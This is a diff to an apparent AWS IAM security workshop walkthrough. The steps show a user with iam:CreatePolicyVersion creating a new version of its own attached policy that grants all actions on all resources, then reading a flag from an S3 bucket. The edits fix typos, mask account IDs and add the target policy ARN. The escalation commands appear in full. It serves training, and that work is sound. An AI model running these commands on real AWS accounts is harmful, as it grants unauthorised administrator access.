@@ -6,12 +6,12 @@
 **Starting Identity:** `iamws-policy-developer-user`
 **Target:** Crown jewels in `s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt`
 
-**The Vulnerability:** `iamws-policy-developer-user` can create new versions of IAM policies — meaning they can update the `iamws-developer-tools-policy`, which is attached to their own user. By creating a new version with administrator permissions and setting it as default, they grant themselves full adminstrator access without touching any other principal or resource.
+**The Vulnerability:** `iamws-policy-developer-user` can create new versions of IAM policies — meaning they can update the `iamws-developer-tools-policy`, which is attached to their own user. By creating a new version with administrator permissions and setting it as default, they grant themselves full administrator access without touching any other principal or resource.
 
-**Real-world scenario:** 
-- Larger orgs often delegate IAM policy management to non-admins — platform engineers, senior developers, policy owners — so the central security team isn't a bottleneck. 
-- When an AWS user or role has the `iam:CreatePolicyVersion` permission attached, they can grant new permissions to other IAM entities as determined by the `Resource` clause. 
-- For example, if a policy grants `iam:CreatePolicyVersion` with `Resource: "*"` (a common scenario because scoping resources included in the policy is often difficult and/or tedious), any user with that policy attached can update any existing policy to add new permissions, including policies attached to their own user. 
+**Real-world scenario:**
+- Larger orgs often delegate IAM policy management to non-admins — platform engineers, senior developers, policy owners — so the central security team isn't a bottleneck.
+- When an AWS user or role has the `iam:CreatePolicyVersion` permission attached, they can grant new permissions to other IAM entities as determined by the `Resource` clause.
+- For example, if a policy grants `iam:CreatePolicyVersion` with `Resource: "*"` (a common scenario because scoping resources included in the policy is often difficult and/or tedious), any user with that policy attached can update any existing policy to add new permissions, including policies attached to their own user.
 - Creating a new version of their own attached policy that allows `*:*` turns delegated policy management into account admin in a single API call.
 
 ### A note on the identities you'll switch between
@@ -90,9 +90,9 @@ aws sts get-caller-identity --profile iamws-policy-developer-user
 Expected output:
 ```json
 {
-    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
-    "Account": "767397689800",
-    "Arn": "arn:aws:iam::767397689800:user/iamws-policy-developer-user"
+    "UserId": "AIDA<user id>",
+    "Account": "<aws account id>",
+    "Arn": "arn:aws:iam::<aws account id>:user/iamws-policy-developer-user"
 }
 ```
 
@@ -120,11 +120,11 @@ Expected output:
     "AttachedPolicies": [
         {
             "PolicyName": "iamws-policy-developer-policy",
-            "PolicyArn": "arn:aws:iam::652026215310:policy/iamws-policy-developer-policy"
+            "PolicyArn": "arn:aws:iam::<aws account id>:policy/iamws-policy-developer-policy"
         },
         {
             "PolicyName": "iamws-developer-tools-policy",
-            "PolicyArn": "arn:aws:iam::652026215310:policy/iamws-developer-tools-policy"
+            "PolicyArn": "arn:aws:iam::<aws account id>:policy/iamws-developer-tools-policy"
         }
     ]
 }
@@ -192,11 +192,15 @@ Expected output:
 }
 ```
 
-The `iamws-developer-policy` policy however, grants `iam:CreatePolicyVersion` and  `iam:SetDefaultPolicyVersion`. This creates the priviledge escalation path.
+The `iamws-policy-developer-policy` policy, however, grants `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion`. This creates the privilege escalation path.
 
 **Step 4: Create a new version of the policy with admin permissions, and set it as default**
 
+Target the `iamws-developer-tools-policy` attached to your user.
+
 ```bash
+POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"
+
 aws iam create-policy-version \
   --policy-arn $POLICY_ARN \
   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
@@ -215,7 +219,7 @@ Example output:
 }
 ```
 
-No error — the user is allowed to create new policy versions, including ones that grant `*:*` - allowing all actions on all resources. 
+No error — the user is allowed to create new policy versions, including ones that grant `*:*` - allowing all actions on all resources.
 
 **Step 5: Claim the crown jewels**
 
